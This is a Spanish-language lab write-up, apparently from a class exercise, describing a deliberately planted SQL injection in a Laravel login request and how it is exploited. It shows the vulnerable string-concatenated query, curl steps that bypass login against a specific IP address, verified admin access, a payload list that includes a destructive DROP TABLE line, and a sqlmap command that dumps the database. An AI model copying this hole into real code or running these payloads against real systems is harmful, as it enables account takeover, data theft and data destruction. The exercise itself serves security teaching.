# 02 - SQL Injection

**Responsable:** Tomi
**Tipo:** Inyección SQL (A03:2021 - Injection)

## Archivo modificado
`app/Http/Requests/Auth/LoginRequest.php` (línea 36-38)

## Cambio realizado
Se reemplazó el uso seguro de `Auth::attempt()` (que usa Eloquent con consultas parametrizadas) por una consulta SQL raw con concatenación directa de strings del usuario:

```php
// 🔥 VULNERABLE - Antes (seguro):
if (! Auth::attempt([$field => $login, 'password' => $password])) { ... }

// 🔥 VULNERABLE - Después (SQLi):
$sql = "SELECT * FROM users WHERE $field = '$login' AND is_active = true LIMIT 1";
$users = DB::select($sql);
if (!empty($users)) {
    Auth::login(User::find($users[0]->id));
}
```

## Explotación

### Paso 1: Obtener CSRF token
```bash
curl -s -c cookies.txt "http://37.60.230.11/login" | grep -oP 'name="_token" value="\K[^"]+'
```

### Paso 2: Inyectar SQL en el login
```bash
curl -s -X POST "http://37.60.230.11/login" \
  -b cookies.txt -c cookies.txt \
  -d "_token=TOKEN&login=admin'+OR+'1'%3D'1'+--&password=x"
```

### Paso 3: Verificar acceso admin
```bash
curl -b cookies.txt "http://37.60.230.11/admin/dashboard"
```

## Resultado (verificado)
```
SQLi LOGIN: HTTP 302 (redirect a /dashboard)
ADMIN DASHBOARD: HTTP 200 (acceso concedido)
```

### Payloads útiles
```
admin' OR '1'='1' --           → Bypass total
admin' --                       → Comentar resto de consulta
' OR 1=1 --                     → Inyección universal
admin' UNION SELECT * FROM users --  → Unión de resultados
'; DROP TABLE users; --        → Destructivo (no recomendado)
```

## Con sqlmap
```bash
sqlmap -u "http://37.60.230.11/login" \
  --data="login=admin&password=test" \
  --batch --level=3 --risk=2 --dump
```

## Impacto
- Acceso total como **admin** sin conocer contraseña
- Visibilidad de todo el panel administrativo
- Potencial acceso a datos de otros usuarios
- Posible extracción masiva de la BD con sqlmap
